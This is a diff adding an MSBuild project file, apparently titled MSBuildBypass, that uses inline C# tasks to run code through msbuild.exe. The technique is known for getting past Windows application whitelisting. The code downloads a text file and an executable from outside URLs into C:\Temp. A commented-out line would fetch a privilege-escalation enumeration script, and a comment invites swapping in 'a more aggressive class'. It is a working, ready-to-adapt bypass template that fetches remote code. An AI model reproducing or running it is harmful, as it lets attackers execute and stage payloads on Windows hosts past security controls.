@@ -1,0 +1,61 @@
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <!-- This inline task executes c# code. -->
+  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildBypass.csproj -->
+  <!-- Feel free to use a more aggressive class for testing. -->
+  <Target Name="Hello">
+   <FragmentExample />
+   <ClassExample />
+  </Target>
+  <UsingTask
+    TaskName="FragmentExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+    <ParameterGroup/>
+    <Task>
+      <Using Namespace="System" />
+      <Code Type="Fragment" Language="cs">
+        <![CDATA[
+			    Console.WriteLine("Hello From a Code Fragment");
+        ]]>
+      </Code>
+    </Task>
+	</UsingTask>
+	<UsingTask
+    TaskName="ClassExample"
+    TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
+	<Task>
+	<!-- <Reference Include="System.IO" /> Example Include -->
+      <Code Type="Class" Language="cs">
+        <![CDATA[
+			using System;
+			using System.Net;
+			using System.IO;
+			using Microsoft.Build.Framework;
+			using Microsoft.Build.Utilities;
+			public class ClassExample :  Task, ITask
+			{
+				public override bool Execute()
+				{
+					//string script = (new System.Net.WebClient()).DownloadString('https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1');
+					
+					string url1 = "https://raw.githubusercontent.com/void010/dummy/main/dummy.txt";
+					string savePath1 = @"C:\Temp\poc.txt";
+					WebClient client1 = new WebClient();
+					client1.DownloadFile(url1, savePath1);
+					Console.WriteLine("Check C:\\Temp for downloaded txt file.");
+					string url2 = "https://www.filehorse.com/download/file/unzAjH3_jFy6FkGe_LTmIf9C7kBJA1nJ-YlBTAcITA6jmo6L4bV3ODdD7PQwv3q_0Xr5-HvI-3z17iomw-_B-7uN-NZkIneM4-zn1bgKwe0/";
+					string savePath2 = @"C:\Temp\7zip.exe";
+					WebClient client2 = new WebClient();
+					client2.DownloadFile(url2, savePath2);
+					Console.WriteLine("Check C:\\Temp for downloaded exe file.");
+					
+					return true;
+				}
+				
+			}
+        ]]>
+      </Code>
+    </Task>
+  </UsingTask>
+</Project>
